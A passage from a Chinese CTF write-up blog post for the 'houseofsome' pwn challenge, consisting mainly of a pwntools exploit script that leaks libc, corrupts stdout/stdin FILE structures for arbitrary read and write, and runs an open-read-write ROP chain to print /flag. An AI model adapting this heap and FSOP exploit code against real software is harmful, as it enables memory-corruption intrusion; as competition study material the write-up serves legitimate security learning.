<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>

<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./houseofsome</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span>
<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">);</span><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x000163A
brva 0x000001875
brva 0x1804
#continue
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
    <span class="c1">#io = process(binary)
</span>    <span class="c1">#io = process('./test/houseofsome')
</span>    <span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">39.106.48.123</span><span class="sh">'</span><span class="p">,</span> <span class="mi">33789</span><span class="p">)</span>


    <span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">i</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">((</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="sh">'</span><span class="s">0</span><span class="sh">'</span> <span class="o">+</span> <span class="sh">'</span><span class="s">1</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">size&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">name&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">x_dev</span><span class="p">(</span><span class="n">dev</span><span class="p">):</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">2</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">dev&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">dev</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">draw</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="n">l</span><span class="p">):</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">3</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">offset&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset</span><span class="p">))</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">length&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">l</span><span class="p">))</span>
    <span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">)</span>


    <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">-</span><span class="sh">'</span><span class="p">)</span> <span class="c1">##
</span>    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">invalid option </span><span class="sh">'</span><span class="p">)</span>
    <span class="n">x</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">.</span><span class="se">\n</span><span class="sh">'</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="mi">2095008</span> <span class="o">-</span> <span class="mh">0x21000</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x40</span>



    <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./libc.so.6</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base</span>
    <span class="n">read</span>            <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">setcontext</span>      <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">setcontext</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">_IO_2_1_stdout_</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stdout_</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">_IO_2_1_stdin_</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stdin_</span><span class="sh">'</span><span class="p">]</span> 
    <span class="n">_IO_2_1_stderr_</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_2_1_stderr_</span><span class="sh">'</span><span class="p">]</span> 
    <span class="n">_IO_wfile_jumps</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_wfile_jumps</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">_IO_list_all</span> <span class="o">=</span>   <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">_IO_list_all</span><span class="sh">'</span><span class="p">]</span>
    <span class="n">environ</span> <span class="o">=</span>   <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">environ</span><span class="sh">'</span><span class="p">]</span>

   
    <span class="c1">#pay  = p64(0) * 14
</span>    <span class="c1">#pay += p64(0x414243) + p64(0x0000000100000000)
</span>    <span class="c1">#pay = pay.ljust(0x100,b'\x00')
</span>    <span class="c1">##pay += p64(0) * (64)
</span>    <span class="c1">##pay += p64(0x414243) + p64(0x0000000100000000)
</span>    <span class="c1">##pay = pay.ljust(0x2f0,b'\x00')
</span>    <span class="c1">#pay = pay * 0x20
</span>    <span class="c1">#add(0x2000,pay)
</span>    <span class="c1">#add(0x2000,pay)
</span>    <span class="c1">#
</span>
    <span class="nf">add</span><span class="p">(</span><span class="mh">0x380</span><span class="p">,</span><span class="sh">'</span><span class="s">1234</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">x_dev</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="c1">#
</span>    <span class="n">target</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">2092288</span><span class="o">+</span><span class="mh">0x21000</span> <span class="o">+</span> <span class="mi">1</span><span class="c1"># main_arena
</span>    <span class="c1">#target = read
</span>    <span class="n">offset</span> <span class="o">=</span> <span class="n">target</span> <span class="o">-</span> <span class="mh">0x114514000</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">target</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">offset</span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">_IO_2_1_stdout_</span><span class="sh">'</span><span class="p">)</span>
    <span class="c1">#gdb.attach(io)
</span>    <span class="c1">#
</span>    <span class="c1">#add(0x3a0,b'\x00'*(0x380-0x88)+p64(0x20031)+b'\x00'*0x28+p64(0x20001))
</span>    <span class="c1">#gdb.attach(io,gdbscript)
</span>    <span class="c1">#gdb.attach(io)
</span>    <span class="nf">draw</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="c1">#pay = flat({
</span>        <span class="c1">#    0x00: 0,
</span>        <span class="c1">#    0x46: 0x010001,
</span>        <span class="c1">#    0x198: 0x114514000,
</span>        <span class="c1">#    0x1a0:_IO_2_1_stdout_
</span>        <span class="c1">#},filler=b"\x00")
</span>        <span class="c1">#pay = flat({
</span>        <span class="c1">#    0x00: 0,
</span>        <span class="c1">#    0x46: 0x010001,
</span>        <span class="c1">#    0x198:_IO_2_1_stdout_+0x68,
</span>        <span class="c1">#    0x1a0: 0x114514010
</span>        <span class="c1">#},filler=b"\x00")
</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="nf">flat</span><span class="p">({</span>
            <span class="mh">0x00</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
            <span class="mh">0x46</span><span class="p">:</span> <span class="mh">0x01</span><span class="p">,</span>
            <span class="mh">0x68</span><span class="p">:</span> <span class="mh">0x01</span><span class="p">,</span>
            <span class="mh">0x198</span><span class="p">:</span><span class="n">_IO_2_1_stdout_</span><span class="p">,</span>
            <span class="mh">0x220</span><span class="p">:</span><span class="n">_IO_2_1_stdin_</span>
        <span class="p">},</span><span class="n">filler</span><span class="o">=</span><span class="sa">b</span><span class="sh">"</span><span class="se">\x00</span><span class="sh">"</span><span class="p">)</span>
        <span class="c1"># tcachebins
</span>        <span class="c1"># 0x250 [  1]: 0x7ff31e1ff808 (_IO_2_1_stdout_+104) ◂— 0x7ff4e12e0b3f
</span>        <span class="c1"># 0x360 [  1]: 0x114514010 ◂— 0x114514
</span>        <span class="c1"># 0x390 [  0]: 0x51
</span>        <span class="nf">add</span><span class="p">(</span><span class="mh">0x230</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">00</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">&gt; </span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">target</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">offset</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">_IO_2_1_stdout_</span><span class="sh">'</span><span class="p">)</span>


        <span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">environ</span><span class="sh">'</span><span class="p">]</span>
        <span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xFBAD1800</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">environ</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span>
        <span class="nf">add</span><span class="p">(</span><span class="mh">0x240</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span> <span class="c1">#  攻击 _IO_2_1_stdout_ 任意地址内容泄露
</span>
        <span class="n">stack</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">1. </span><span class="sh">'</span><span class="p">))</span> <span class="o">-</span> <span class="mi">2408</span> <span class="o">+</span> <span class="mh">0x18</span>
        <span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">stack</span><span class="sh">'</span><span class="p">)</span>

        <span class="n">pay</span> <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">stack</span> <span class="o">+</span> <span class="mh">0x400</span><span class="p">)</span>
        <span class="c1">#gdb.attach(io)
</span>        <span class="nf">add</span><span class="p">(</span><span class="mh">0x350</span><span class="p">,</span><span class="n">pay</span><span class="p">)</span> <span class="c1">#  攻击 _IO_2_1_stdin_ 任意地址写入内容
</span>
        <span class="c1">#栈上 ORW_ROP
</span>        <span class="nf">pause</span><span class="p">()</span>

        <span class="c1">## ORW_ROP
</span>        <span class="n">libc_rop</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
        <span class="n">rax</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rax</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">rdi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rdi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">rsi</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">pop rsi</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
        <span class="c1">#rdx = libc_rop.find_gadget(['pop rdx','ret'])[0]
</span>        <span class="n">rdx</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000096272</span> <span class="c1">#pop rdx ; or al, 0 ; ret
</span>        <span class="c1">#rdx = libc_rop.find_gadget(['pop rdx','pop rbx','ret'])[0]
</span>        <span class="n">syscall</span> <span class="o">=</span> <span class="n">libc_rop</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">syscall</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>

        <span class="n">orw_rop_addr</span> <span class="o">=</span> <span class="n">stack</span>

        <span class="n">orw_rop</span>  <span class="o">=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>  <span class="nf">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
        <span class="n">orw_rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">read</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">orw_rop</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdx</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rdi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">rsi</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">orw_rop_addr</span><span class="o">+</span><span class="mh">0xb8</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="sh">'</span><span class="s">write</span><span class="sh">'</span><span class="p">])</span>
        <span class="n">orw_rop</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/flag</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
        <span class="nf">sl</span><span class="p">(</span><span class="n">orw_rop</span><span class="p">)</span>

        <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">io</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
        <span class="k">continue</span>


</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122042342-11fgnea.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122042342-11fgnea.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<p>‍</p>

<h2 id="参考出题人博客的houseofsome"><span class="me-2">参考出题人博客的houseofsome</span><a href="#参考出题人博客的houseofsome" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">csome</span><span class="p">.</span><span class="n">cc</span><span class="o">/</span><span class="n">p</span><span class="o">/</span><span class="n">house</span><span class="o">-</span><span class="n">of</span><span class="o">-</span><span class="n">some</span><span class="o">/</span><span class="c1">#FSOP%EF%BC%81
</span></pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122042434-1cyaxdy.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023年春秋杯网络安全联赛冬季赛pwn方向houseofsome-WriteUps/assets/image-20240122042434-1cyaxdy.png" alt="image" loading="lazy"></a>​</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/ctf/">CTF</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/ctf/"
            class="post-tag no-text-decoration"
          >CTF</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          本文由作者按照 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         进行授权
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">分享</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2023%25E5%25B9%25B4%25E6%2598%25A5%25E7%25A7%258B%25E6%259D%25AF%25E7%25BD%2591%25E7%25BB%259C%25E5%25AE%2589%25E5%2585%25A8%25E8%2581%2594%25E8%25B5%259B%25E5%2586%25AC%25E5%25AD%25A3%25E8%25B5%259Bpwn%25E6%2596%25B9%25E5%2590%2591houseofsome-WriteUps%2F&title=2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="QQ" aria-label="QQ">
        <i class="fa-fw fa-brands fa-qq"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps%20-%20imLZH1'%20Blog&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2023%25E5%25B9%25B4%25E6%2598%25A5%25E7%25A7%258B%25E6%259D%25AF%25E7%25BD%2591%25E7%25BB%259C%25E5%25AE%2589%25E5%2585%25A8%25E8%2581%2594%25E8%25B5%259B%25E5%2586%25AC%25E5%25AD%25A3%25E8%25B5%259Bpwn%25E6%2596%25B9%25E5%2590%2591houseofsome-WriteUps%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2F2023%25E5%25B9%25B4%25E6%2598%25A5%25E7%25A7%258B%25E6%259D%25AF%25E7%25BD%2591%25E7%25BB%259C%25E5%25AE%2589%25E5%2585%25A8%25E8%2581%2594%25E8%25B5%259B%25E5%2586%25AC%25E5%25AD%25A3%25E8%25B5%259Bpwn%25E6%2596%25B9%25E5%2590%2591houseofsome-WriteUps%2F&text=2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E5%86%AC%E5%AD%A3%E8%B5%9Bpwn%E6%96%B9%E5%90%91houseofsome-WriteUps%20-%20imLZH1'%20Blog" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="分享链接"
      data-title-succeed="链接已复制！"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 mb-5 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">最近更新</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/2025CCB/">第二届“长城杯”信息安全铁人三项赛（防护赛）总决赛-Pwn方向部分题解</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/squ1rrel-CTF-PWN-g1P03n/">squ1rrelCTF Pwn WriteUp - g1P03n</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Cyber-Apocalypse-CTF-2025-Tales-from-Eldoria/">HTB - Cyber Apocalypse CTF 2025 Tales from Eldoria - Pwn WriteUp</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/CCB_CISCN_AWDP-Pwn/">CCB_CISCN_半决赛-AWDP-Pwn</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Kernel-Pwn-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-1/">Kernel Pwn 刷题记录</a>
        </li>
      
    </ul>
  </section>
